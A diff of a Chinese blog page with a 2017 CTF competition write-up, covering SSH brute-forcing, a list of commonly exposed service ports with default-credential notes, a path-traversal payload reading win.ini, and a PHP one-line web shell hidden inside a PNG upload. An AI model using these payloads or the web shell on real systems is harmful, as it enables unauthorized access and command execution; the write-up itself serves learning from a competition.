@@ -212,35 +212,59 @@
         </header>
 
         <div class="post-content">
-            <p><img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-23-66.jpg"> <a id="more"></a> #
-WEB1 靶机只扫描到22的ssh端口 那么思路只有一个，只能爆破</p>
+            <p><img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-23-66.jpg">
+<a id="more"></a></p>
+<h1 id="web1">WEB1</h1>
+<p>靶机只扫描到22的ssh端口 那么思路只有一个，只能爆破</p>
 <p>用的是一个SSH爆破工具<strong>SSH_Crack</strong>
 <strong>百度云下载链接:</strong><a href="https://pan.baidu.com/s/1qX9lyZM" target="_blank" rel="noopener">https://pan.baidu.com/s/1qX9lyZM</a>
 然后下几个弱密码字典，放进去跑，然而并没有什么用
 最后到结束也没跑出来，跑到怀疑人生。结束后问别队，他们说最后半小时出现了一个5984的端口</p>
 <blockquote>
-<p>+21 ftp +22 SSH +23 Telnet +80 web +80-89 web +161 SNMP +389 LDAP
-+443 SSL心脏滴血以及一些web漏洞测试 +445 SMB +512,513,514 Rexec +873
-Rsync未授权 +1025,111 NFS +1433 MSSQL +1521 Oracle:(iSqlPlus
-Port:5560,7778) +2082/2083 cpanel主机管理系统登陆 （国外用较多） +2222
-DA虚拟主机管理系统登陆 （国外用较多） +2601,2604
-zebra路由，默认密码zebra +3128
-squid代理默认端口，如果没设置口令很可能就直接漫游内网了 +3306 MySQL
-+3312/3311 kangle主机管理系统登陆 +3389 远程桌面 +4440 rundeck
-参考WooYun: 借用新浪某服务成功漫游新浪内网 +5432 PostgreSQL +5900 vnc
-+5984 CouchDB http://xxx:5984/_utils/ +6082 varnish 参考WooYun: Varnish
-HTTP accelerator CLI
-未授权访问易导&gt;+致网站被直接篡改或者作为代理进入内网 +6379
-redis未授权 +7001,7002 WebLogic默认弱口令，反序列 +7778
-Kloxo主机控制面板登录 +8000-9090
-都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 +8080
-tomcat/WDCP主机管理系统，默认弱口令 +8080,8089,9090 JBOSS +8083
-Vestacp主机管理系统 (国外用较多) +8649 ganglia +8888 amh/LuManager
-主机管理系统默认端口 +9200,9300 elasticsearch 参考WooYun:
-多玩某服务器ElasticSearch命令执&gt;+行漏洞 +10000 Virtualmin/Webmin
-服务器虚拟主机管理系统 +11211 memcache未授权访问 +27017,27018
-Mongodb未授权访问 +28017 mongodb统计页面 +50000 SAP命令执行 +50070,50030
-hadoop默认端口未授权访问</p>
+<p>+21 ftp</p>
+<p>+22 SSH</p>
+<p>+23 Telnet</p>
+<p>+80 web</p>
+<p>+80-89 web</p>
+<p>+161 SNMP</p>
+<p>+389 LDAP</p>
+<p>+443 SSL心脏滴血以及一些web漏洞测试</p>
+<p>+445 SMB</p>
+<p>+512,513,514 Rexec</p>
+<p>+873 Rsync未授权</p>
+<p>+1025,111 NFS</p>
+<p>+1433 MSSQL</p>
+<p>+1521 Oracle:(iSqlPlus Port:5560,7778)</p>
+<p>+2082/2083 cpanel主机管理系统登陆 （国外用较多）</p>
+<p>+2222 DA虚拟主机管理系统登陆 （国外用较多）</p>
+<p>+2601,2604 zebra路由，默认密码zebra</p>
+<p>+3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了</p>
+<p>+3306 MySQL</p>
+<p>+3312/3311 kangle主机管理系统登陆</p>
+<p>+3389 远程桌面</p>
+<p>+4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网</p>
+<p>+5432 PostgreSQL</p>
+<p>+5900 vnc</p>
+<p>+5984 CouchDB http://xxx:5984/_utils/</p>
+<p>+6082 varnish 参考WooYun: Varnish HTTP accelerator CLI
+未授权访问易导&gt;+致网站被直接篡改或者作为 代理进入内网</p>
+<p>+6379 redis未授权</p>
+<p>+7001,7002 WebLogic默认弱口令，反序列</p>
+<p>+7778 Kloxo主机控制面板登录</p>
+<p>+8000-9090
+都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上</p>
+<p>+8080 tomcat/WDCP主机管理系统，默认弱口令</p>
+<p>+8080,8089,9090 JBOSS</p>
+<p>+8083 Vestacp主机管理系统 (国外用较多)</p>
+<p>+8649 ganglia</p>
+<p>+8888 amh/LuManager 主机管理系统默认端口 +9200,9300 elasticsearch
+参考WooYun: 多玩某服务器ElasticSearch命令执&gt;+行漏洞</p>
+<p>+10000 Virtualmin/Webmin 服务器虚拟主机管理系统</p>
+<p>+11211 memcache未授权访问</p>
+<p>+27017,27018 Mongodb未授权访问</p>
+<p>+28017 mongodb统计页面</p>
+<p>+50000 SAP命令执行</p>
+<p>+50070,50030 hadoop默认端口未授权访问</p>
 </blockquote>
 <p><strong>神坑!!!</strong>
 至于5984端口的利用，就在此留个坑吧，有兴趣的可以查一下资料，本菜就不写了
@@ -264,16 +288,14 @@ by修改表序列，是一个显式union注入 <strong>payload:</strong></p>
 <h5 id="有问题变量在模板参数tpl处">有问题变量在模板参数tpl处</h5>
 <p>被设置为<code>../../../../../../../windows/win.ini%00.jpg</code> <img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-21-47.jpg"></p>
 <h3 id="科普">科普</h3>
-<p>还是科普一下
-<code>../</code>是DOS命令及linux的shell命令的上层目录的意思
-windows/win.ini，可以对照一下你C盘的C:.ini 是一个系统的配置文件
-%00是截断符，../回溯至win.ini后将读取win.ini%00.jpg
+<p>还是科普一下 windows/win.ini，可以对照一下你C盘的C:.ini
+是一个系统的配置文件 %00是截断符，../回溯至win.ini后将读取win.ini%00.jpg
 因为windows的读取特性，后缀名.jpg会被截断，将会读取win.ini达到任意文件读取的目的
 然后其他两名队友Jason&amp;&amp;Unk0wn发现有一个图片上传点，但是上传的文件会被改名成静态图像文件，并且上传会过滤PHP等解析格式
 随后我就有一个大胆的想法(其实当时只是想死马当活马医)
-对，就是用目录遍历漏洞包含图像，使得上传的被我插入一句话木马的静态文件解析成php
-### 尝试
-上传点过滤PHP后缀，截断以及该Content-Type无济于事，索性直接上传PNG文件，保留文件头和结束标记，在中间插入一句话
+对，就是用目录遍历漏洞包含图像，使得上传的被我插入一句话木马的静态文件解析成php</p>
+<h3 id="尝试">尝试</h3>
+<p>上传点过滤PHP后缀，截断以及该Content-Type无济于事，索性直接上传PNG文件，保留文件头和结束标记，在中间插入一句话
 大概是这样子的</p>
 <div class="sourceCode" id="cb2"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span> <span class="fu">system</span>(<span class="va">$_POST</span>[<span class="dv">1</span>])<span class="ot">;</span><span class="kw">echo</span> <span class="dv">1</span><span class="ot">;</span><span class="kw">?&gt;</span></span></code></pre></div>
 <p><img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-37-40.jpg"></p>
@@ -301,16 +323,21 @@ windows/win.ini，可以对照一下你C盘的C:.ini 是一个系统的配置文
 <h6 id="发生了两次宕机其中有一次长达半个多小时比赛才6个小时欲哭无泪">发生了两次宕机，其中有一次长达半个多小时，比赛才6个小时欲哭无泪</h6>
 <h2 id="比赛继续">比赛继续</h2>
 <p>通过phpinfo可以知道disable_functions=proc_open,passthru,exec,system,shell_exec,,popen
-这些函数都被禁用了 &gt;proc_open() &gt; -
-功能描述：执行一个命令并打开文件指针用于读取以及写入。 &gt;
-&gt;passthru() &gt; - 功能描述：允许执行一个外部程序并回显输出，类似于
-exec()。 &gt; &gt;exec() &gt; - 功能描述：允许执行一个外部程序（如 UNIX
-Shell 或 CMD 命令等）。 &gt; &gt;system() &gt; -
-功能描述：允许执行一个外部程序并回显输出，类似于 passthru()。 &gt;
-&gt;shell_exec() &gt; -功能描述：通过 Shell
-执行命令，并将执行结果作为字符串返回。 &gt; &gt;popen() &gt; -
-功能描述：可通过 popen() 的参数传递一条命令，并对 popen()
+这些函数都被禁用了</p>
+<blockquote>
+<p>proc_open() -
+功能描述：执行一个命令并打开文件指针用于读取以及写入。</p>
+<p>passthru() - 功能描述：允许执行一个外部程序并回显输出，类似于
+exec()。</p>
+<p>exec() - 功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD
+命令等）。</p>
+<p>system() - 功能描述：允许执行一个外部程序并回显输出，类似于
+passthru()。</p>
+<p>shell_exec() -功能描述：通过 Shell
+执行命令，并将执行结果作为字符串返回。</p>
+<p>popen() - 功能描述：可通过 popen() 的参数传递一条命令，并对 popen()
 所打开的文件进行执行。</p>
+</blockquote>
 <p>那就十分尴尬了 我们能解析php但是并不能执行系统函数</p>
 <h2 id="端口">3389 端口</h2>
 <p>由于WEB3是开了3389端口，而且我们又能执行php的大部分代码，故我又产生了一个大胆的想法</p>
